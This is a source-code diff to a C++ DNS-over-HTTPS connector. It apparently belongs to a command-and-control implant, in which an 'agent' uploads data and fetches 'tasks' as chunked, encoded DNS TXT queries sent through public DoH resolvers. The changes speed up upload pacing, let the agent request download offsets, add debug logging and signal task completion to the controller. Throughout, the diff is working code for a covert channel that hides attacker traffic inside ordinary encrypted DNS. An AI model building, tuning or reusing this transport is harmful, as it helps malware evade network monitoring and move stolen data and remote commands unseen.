@@ -1005,9 +1005,9 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 			ULONG tmpSize = 0;
 			DohQueryTxt(qname, tmp, sizeof(tmp), &tmpSize);
 
-			// Pacing: keep QPS low to avoid DoH resolver rate-limiting.
-			// Use 100-150ms delay for large uploads through public DoH.
-			ULONG pacing = 100 + (GetTickCount() % 50);
+			// Pacing: 30-50ms (~20-30 packets/sec).
+			// Public DoH resolvers can handle this rate.
+			ULONG pacing = 30 + (GetTickCount() % 20);
 			ApiWin->Sleep(pacing);
 
 			offset += chunk;
@@ -1113,9 +1113,19 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 		}
 	}
 
-	DnsBuildQName(this->sid, "api", ++this->seq, this->idx, "", this->domain, qname, sizeof(qname));
-	// Larger buffers to safely hold big Base64-encoded TXT responses for multi-fragment
-	// downlink frames (e.g. 856-byte binary frames + 8-byte header -> ~1.2KB Base64).
+	// NEW DESIGN: Agent controls offset - encode requested offset in QNAME
+	ULONG reqOffset = this->downFilled;
+	BYTE reqOffBytes[4];
+	reqOffBytes[0] = (BYTE)((reqOffset >> 24) & 0xFF);
+	reqOffBytes[1] = (BYTE)((reqOffset >> 16) & 0xFF);
+	reqOffBytes[2] = (BYTE)((reqOffset >> 8) & 0xFF);
+	reqOffBytes[3] = (BYTE)((reqOffset >> 0) & 0xFF);
+	CHAR reqOffLabel[16];
+	memset(reqOffLabel, 0, sizeof(reqOffLabel));
+	DnsBase32Encode(reqOffBytes, 4, reqOffLabel, sizeof(reqOffLabel));
+	
+	DnsBuildQName(this->sid, "api", ++this->seq, this->idx, reqOffLabel, this->domain, qname, sizeof(qname));
+	DnsDebugLogf("[DoH] GET(TXT): seq=%lu reqOffset=%lu", this->seq, reqOffset);
 	BYTE respBuf[4096];
 	ULONG respSize = 0;
 	if (DohQueryTxt(qname, respBuf, sizeof(respBuf), &respSize) && respSize > 0) {
@@ -1146,17 +1156,16 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 			offset |= ((ULONG)binBuf[6] << 8);
 			offset |= ((ULONG)binBuf[7] << 0);
 			ULONG chunkLen = (ULONG)(binLen - (int)headerSize);
+			DnsDebugLogf("[DoH] GET: chunk total=%lu offset=%lu len=%lu (wanted=%lu)", total, offset, chunkLen, reqOffset);
 			const ULONG maxDownloadSize = 4u << 20; // 4MB
 			if (total > 0 && total <= maxDownloadSize && offset < total) {
-				CHAR dbg[160];
-				_snprintf(dbg, sizeof(dbg),
-					"[DoH] Down: total=%lu offset=%lu chunkLen=%lu downFilled=%lu downTotal=%lu",
-					(unsigned long)total,
-					(unsigned long)offset,
-					(unsigned long)chunkLen,
-					(unsigned long)this->downFilled,
-					(unsigned long)this->downTotal);
-				DohConnectorLog(dbg);
+				// NEW DESIGN: Verify received offset matches what we requested.
+				if (offset != reqOffset) {
+					DnsDebugLogf("[DoH] GET: OFFSET MISMATCH! Got %lu, wanted %lu - discarding", offset, reqOffset);
+					return;
+				}
+				
+				// Initialize buffer if needed (starting a NEW task)
 				if (!this->downBuf || this->downTotal != total) {
 					if (this->downBuf && this->downTotal) {
 						MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
@@ -1169,31 +1178,19 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 					}
 					this->downTotal = total;
 					this->downFilled = 0;
+					this->downAckOffset = 0; // Reset ACK offset for NEW task
+					DnsDebugLogf("[DoH] GET: starting new task, total=%lu bytes", total);
 				}
 
-				// If we receive offset 0 but already have some data, reset buffer
-				if (offset == 0 && this->downFilled > 0) {
-					DohConnectorLog("[DoH] Down: offset==0 with existing data, resetting buffer");
-					if (this->downBuf && this->downTotal) {
-						MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
-					}
-					this->downBuf = (BYTE*)MemAllocLocal(total);
-					if (!this->downBuf) {
-						this->downTotal = 0;
-						this->downFilled = 0;
-						return;
-					}
-					this->downTotal = total;
-					this->downFilled = 0;
-				}
-
+				// Copy chunk at the correct offset
 				ULONG end = offset + chunkLen;
 				if (end > total)
 					end = total;
 				ULONG n = end - offset;
 				memcpy(this->downBuf + offset, binBuf + headerSize, n);
-				this->downFilled += n;
-				// 更新 ACK offset - 记录已接收的最大连续 offset
+				
+				// Update progress: since we request sequentially, downFilled = offset + n
+				this->downFilled = offset + n;
 				this->downAckOffset = this->downFilled;
 				DnsDebugLogf("[DoH] GET: reassembly progress %lu/%lu (%.1f%%)", 
 				             this->downFilled, this->downTotal, 
@@ -1248,13 +1245,13 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 					this->recvData = finalBuf;
 					this->recvSize = (int)finalSize;
 					this->lastDownTotal = finalSize;
+					// Keep downAckOffset = downTotal so next heartbeat ACKs completion!
+					this->downAckOffset = this->downTotal; // Signal completion
 					this->downBuf = NULL;
 					this->downTotal = 0;
 					this->downFilled = 0;
-					// 重置 ACK offset 和 pending 状态，任务下载完成
-					this->downAckOffset = 0;
 					this->hasPendingTasks = FALSE;
-					DnsDebugLogf("[DoH] GET: task ready, size=%lu bytes", finalSize);
+					DnsDebugLogf("[DoH] GET: task ready, size=%lu bytes, ackOffset=%lu (will ACK completion)", finalSize, this->downAckOffset);
 				}
 				return;
 			}
